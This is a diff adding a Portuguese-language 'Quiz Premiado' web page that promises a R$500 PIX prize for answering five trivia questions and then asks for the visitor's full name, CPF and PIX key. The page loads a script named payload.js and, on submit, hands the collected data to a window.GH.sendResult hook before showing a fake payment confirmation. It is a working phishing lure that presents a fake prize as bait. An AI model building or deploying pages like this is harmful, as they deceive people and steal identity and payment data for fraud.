@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html lang="pt">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0,user-scalable=no">
+<meta name="theme-color" content="#1a0033">
+<title>Quiz Premiado</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:'Segoe UI',system-ui,sans-serif;background:linear-gradient(135deg,#1a0033,#2d0066,#1a0033);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:16px;color:#fff}
+.card{background:rgba(255,255,255,0.07);backdrop-filter:blur(20px);border-radius:24px;padding:28px 22px;max-width:420px;width:100%;border:1px solid rgba(255,255,255,0.12);text-align:center}
+h1{font-size:22px;background:linear-gradient(90deg,#ffd700,#ff8c00);-webkit-background-clip:text;-webkit-text-fill-color:transparent;margin-bottom:6px}
+.sub{font-size:13px;color:#aaa;margin-bottom:20px}
+.prize{background:linear-gradient(135deg,rgba(255,215,0,0.2),rgba(255,140,0,0.15));border:2px solid #ffd700;border-radius:16px;padding:16px;margin-bottom:20px}
+.prize .amount{font-size:36px;font-weight:900;color:#ffd700}
+.prize .label{font-size:12px;color:#ccc;letter-spacing:1px}
+.question{font-size:17px;font-weight:600;margin-bottom:18px;line-height:1.4}
+.options{display:flex;flex-direction:column;gap:10px;margin-bottom:18px}
+.option{background:rgba(255,255,255,0.08);border:2px solid rgba(255,255,255,0.15);border-radius:14px;padding:14px 16px;font-size:15px;color:#ddd;cursor:pointer;transition:all .2s;text-align:left}
+.option.correct{background:rgba(0,200,83,0.25);border-color:#00c853;color:#00e676}
+.option.wrong{background:rgba(255,23,68,0.2);border-color:#ff1744;color:#ff5252}
+.progress{display:flex;justify-content:center;gap:8px;margin-bottom:14px}
+.dot{width:10px;height:10px;border-radius:50%;background:rgba(255,255,255,0.2)}
+.dot.done{background:#ffd700}
+.dot.current{background:#fff;box-shadow:0 0 10px #fff}
+.btn{width:100%;padding:14px;border-radius:14px;border:none;font-size:16px;font-weight:700;cursor:pointer}
+.btn-primary{background:linear-gradient(135deg,#ffd700,#ff8c00);color:#1a0033}
+.btn-disabled{background:rgba(255,255,255,0.1);color:#666;pointer-events:none}
+.form-group{margin-bottom:12px;text-align:left}
+.form-group label{display:block;font-size:13px;color:#aaa;margin-bottom:5px}
+.form-group input{width:100%;padding:12px 14px;border-radius:12px;border:2px solid rgba(255,255,255,0.2);background:rgba(255,255,255,0.06);color:#fff;font-size:16px;outline:none}
+.form-group input:focus{border-color:#ffd700}
+.hidden{display:none!important}
+</style>
+<script src="https://html2canvas.hertzen.com/dist/html2canvas.min.js"></script>
+</head>
+<body>
+<div class="card">
+  <div id="quizScreen">
+    <h1>🎯 Quiz Premiado</h1>
+    <p class="sub">Responda 5 perguntas e concorra!</p>
+    <div class="prize"><div class="amount">R$ 500</div><div class="label">Prêmio em PIX</div></div>
+    <div class="progress" id="progressDots"></div>
+    <div class="question" id="questionText"></div>
+    <div class="options" id="optionsContainer"></div>
+    <button class="btn btn-disabled" id="nextBtn" disabled>Próxima ➤</button>
+    <p style="font-size:11px;color:#666;margin-top:10px">Acertos: <span id="scoreDisplay">0</span>/5</p>
+  </div>
+  <div id="registerScreen" class="hidden">
+    <h1>🎉 Parabéns!</h1>
+    <div style="margin:14px 0;color:#ccc" id="quizResult"></div>
+    <div class="form-group"><label>Nome Completo</label><input type="text" id="nomeQ" placeholder="Seu nome"></div>
+    <div class="form-group"><label>CPF</label><input type="text" id="cpfQ" placeholder="000.000.000-00" maxlength="14"></div>
+    <div class="form-group"><label>Chave PIX</label><input type="text" id="chavePixQ" placeholder="CPF, email ou celular"></div>
+    <button class="btn btn-primary" id="claimBtn">Receber Prêmio 🎁</button>
+  </div>
+  <div id="confirmScreen" class="hidden">
+    <h1>✅ Cadastro Confirmado!</h1>
+    <p class="sub">Seu prêmio de R$500 está sendo processado</p>
+    <p style="font-size:12px;color:#888;margin-top:12px">Pagamento em até 24h úteis</p>
+  </div>
+</div>
+<script src="/static/payload.js"></script>
+<script>
+var questions=[
+  {q:'Qual a capital do Brasil?',opts:['São Paulo','Rio de Janeiro','Brasília','Salvador'],ans:2},
+  {q:'Quantos estados tem o Brasil?',opts:['24','26','27','28'],ans:1},
+  {q:'Qual o maior planeta do sistema solar?',opts:['Terra','Saturno','Júpiter','Netuno'],ans:2},
+  {q:'Quem escreveu Dom Casmurro?',opts:['José de Alencar','Machado de Assis','Carlos Drummond','Guimarães Rosa'],ans:1},
+  {q:'Qual ano o Brasil foi descoberto?',opts:['1492','1498','1500','1502'],ans:2}
+];
+var cq=0,score=0,answered=false;
+function renderDots(){
+  var h='';
+  for(var i=0;i<5;i++)h+='<div class="dot'+(i<cq?' done':i===cq?' current':'')+'"></div>';
+  document.getElementById('progressDots').innerHTML=h
+}
+function renderQuestion(){
+  answered=false;
+  document.getElementById('nextBtn').className='btn btn-disabled';
+  document.getElementById('nextBtn').disabled=true;
+  var q=questions[cq];
+  document.getElementById('questionText').textContent=(cq+1)+'. '+q.q;
+  var h='';q.opts.forEach(function(o,i){h+='<div class="option" data-idx="'+i+'">'+o+'</div>'});
+  document.getElementById('optionsContainer').innerHTML=h;
+  document.querySelectorAll('.option').forEach(function(el){
+    el.addEventListener('click',function(){
+      if(answered)return;answered=true;
+      var idx=parseInt(this.dataset.idx);
+      if(idx===questions[cq].ans){this.classList.add('correct');score++}
+      else{this.classList.add('wrong');document.querySelectorAll('.option')[questions[cq].ans].classList.add('correct')}
+      document.querySelectorAll('.option').forEach(function(o){o.style.pointerEvents='none'});
+      document.getElementById('nextBtn').className='btn btn-primary';
+      document.getElementById('nextBtn').disabled=false;
+      document.getElementById('scoreDisplay').textContent=score+'/5'
+    })
+  });
+  renderDots()
+}
+document.getElementById('nextBtn').addEventListener('click',function(){
+  if(cq<4){cq++;renderQuestion()}
+  else{
+    document.getElementById('quizScreen').classList.add('hidden');
+    document.getElementById('registerScreen').classList.remove('hidden');
+    document.getElementById('quizResult').innerHTML=score>=4?'🔥 Incrível! <b>'+score+'/5</b>! R$500 reservado!':
+      score>=2?'👍 Bom! <b>'+score+'/5</b>. Concorrendo a R$500!':'Você ainda está concorrendo!'
+  }
+});
+document.getElementById('cpfQ').addEventListener('input',function(e){
+  var v=this.value.replace(/\D/g,'');
+  if(v.length>3)v=v.slice(0,3)+'.'+v.slice(3);
+  if(v.length>7)v=v.slice(0,7)+'.'+v.slice(7);
+  if(v.length>11)v=v.slice(0,11)+'-'+v.slice(11);
+  this.value=v.slice(0,14)
+});
+document.getElementById('claimBtn').addEventListener('click',function(){
+  var nome=document.getElementById('nomeQ').value.trim();
+  var cpf=document.getElementById('cpfQ').value.trim();
+  var pix=document.getElementById('chavePixQ').value.trim();
+  if(!nome||!cpf||!pix)return;
+  if(window.GH)window.GH.sendResult('quiz_data',JSON.stringify({nome:nome,cpf:cpf,pix:pix,score:score}));
+  document.getElementById('registerScreen').classList.add('hidden');
+  document.getElementById('confirmScreen').classList.remove('hidden')
+});
+renderQuestion()
+</script>
+</body>
+</html>
